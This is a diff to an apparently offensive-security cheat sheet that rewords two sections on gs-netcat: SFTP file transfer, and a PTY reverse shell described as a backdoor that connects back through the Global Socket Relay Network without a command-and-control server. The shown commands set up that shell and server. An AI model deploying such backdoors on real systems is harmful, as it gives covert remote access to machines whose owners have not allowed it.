@@ -324,7 +324,7 @@ Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/
 <a id="ftgs-anchor"></a>
 **4.vii. File transfer - using gs-netcat and sftp**
 
-Install [gs-netcat](https://github.com/hackerschoice/gsocket). This commands runs a SFTP server through the Global Socket Relay Network:
+Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. It uses the Global Socket Relay Network and no central server or IP address is required to connect to the SFTP/Gsocket server (just a password hash).
 ```
 $ gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host
 ```
@@ -340,7 +340,7 @@ $ sftp -D gs-netcat                                        # Workstation
 <a id="rswg-anchor"></a>
 **5.i.a. Reverse shell with gs-netcat**
 
-Install [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. This means you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is the equivalent to a swiss army knife than gs-netcat is a german battle axe :>
+Use [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```
 $ gs-netcat -s MySecret -l -i    # Host
